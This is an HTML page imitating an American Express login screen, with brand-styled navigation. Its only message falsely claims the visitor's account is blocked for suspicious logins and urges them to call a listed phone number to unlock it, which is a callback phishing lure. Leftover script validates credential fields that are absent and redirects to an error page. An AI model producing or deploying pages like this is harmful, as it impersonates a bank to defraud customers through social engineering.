<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Amex Login</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: #f3f3f3;
    }

    .navbar {
      background-color: white;
      display: flex;
      align-items: center;
      padding: 10px 30px;
      border-bottom: 1px solid #ddd;
      justify-content: space-between;
      flex-wrap: wrap;
      gap: 10px;
    }

    .logo img {
      height: 30px;
      max-width: 100%;
    }

    .navbar nav {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      flex: 1 1 auto;
      justify-content: center;
    }

    .navbar nav a {
      margin: 0 10px;
      text-decoration: none;
      color: #0077c5;
      font-weight: 500;
      white-space: nowrap;
    }

    .right-nav {
      display: flex;
      align-items: center;
      gap: 15px;
      flex-wrap: wrap;
      justify-content: flex-end;
      min-width: 150px;
    }

    .login-button {
      background-color: #0077c5;
      color: white;
      border: none;
      padding: 8px 16px;
      border-radius: 4px;
      cursor: pointer;
      white-space: nowrap;
    }

    .container {
      display: flex;
      justify-content: center;
      padding: 40px 20px;
      gap: 40px;
      flex-wrap: wrap;
    }

    .login-box {
      background-color: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 350px;
      max-width: 100%;
      box-sizing: border-box;
    }

    .login-box h2 {
      margin-bottom: 20px;
      font-weight: normal;
    }

    .login-box label {
      display: block;
      margin: 15px 0 5px;
      font-weight: bold;
    }

    .login-box input[type="text"],
    .login-box input[type="password"],
    .login-box select {
      width: 100%;
      padding: 10px;
      border: 1px solid #bbb;
      border-radius: 4px;
      background-color: #f7f9fa;
    }

    .error {
      border-color: red !important;
      background-color: #ffe6e6 !important;
    }

    .password-container {
      position: relative;
    }

    .show-password {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      color: #0077c5;
      cursor: pointer;
      font-size: 14px;
    }

    .remember {
      margin-top: 15px;
    }

    .login-submit {
      margin-top: 20px;
      width: 100%;
      background-color: #0077c5;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }

    .promo-box img {
      width: 350px;
      border-radius: 8px;
      max-width: 100%;
      height: auto;
      display: block;
    }

    p strong {
      font-size: 1rem;
      line-height: 1.4;
      color: #000;
    }

    p strong a {
      color: blue;
      text-decoration: none;
    }

    /* Responsive styles */
    @media (max-width: 768px) {
      .navbar {
        padding: 10px 15px;
      }

      .logo img {
        height: 25px;
      }

      .navbar nav {
        justify-content: center;
        gap: 8px;
      }

      .navbar nav a {
        margin: 5px;
        font-size: 14px;
      }

      .right-nav {
        justify-content: center;
        min-width: auto;
        gap: 10px;
      }

      .container {
        flex-direction: column;
        padding: 20px 15px;
        gap: 30px;
      }

      .login-box {
        width: 100%;
        padding: 20px;
      }

      .promo-box img {
        width: 100%;
      }
    }

    @media (max-width: 400px) {
      .logo img {
        height: 20px;
      }

      .navbar nav a {
        font-size: 13px;
        margin: 4px 6px;
      }

      .login-button {
        padding: 6px 12px;
        font-size: 14px;
      }

      p strong {
        font-size: 0.9rem;
      }
    }
  </style>
</head>
<body>
  <header class="navbar">
    <div class="logo">
      <img src="logo.png" alt="Amex Logo" />
    </div>
    <nav>
      <a href="#">My Account</a>
      <a href="#">Cards</a>
      <a href="#">Banking</a>
      <a href="#">Travel</a>
      <a href="#">Rewards & Benefits</a>
      <a href="#">Business</a>
    </nav>
    <div class="right-nav">
      <span class="search-icon">üîç</span>
      <a href="#">Customer Service</a>
      <button class="login-button">Log In</button>
    </div>
  </header>

  <main class="container">
    <div class="login-box">
      <form onsubmit="return validateForm(event)">
        <p>
          <strong>
            Your American Express account access has been blocked due to suspicious login attempts. 
            Contact our customer service team at 
            <a href="tel:+18443925473">+1 (844) 392-5473</a> to verify and unlock your account.
          </strong>
        </p>
      </form>
    </div>
  </main>

  <script>
    function togglePassword() {
      const password = document.getElementById("password");
      password.type = password.type === "password" ? "text" : "password";
    }

    function validateForm(event) {
      event.preventDefault();
      const userId = document.getElementById("userId");
      const password = document.getElementById("password");
      let valid = true;

      if(userId) userId.classList.remove("error");
      if(password) password.classList.remove("error");

      if(userId && userId.value.trim() === "") {
        userId.classList.add("error");
        valid = false;
      }

      if(password && password.value.trim() === "") {
        password.classList.add("error");
        valid = false;
      }

      if (!valid) {
        return false;
      }

      window.location.href = "error.html";
    }
  </script>
</body>
</html>
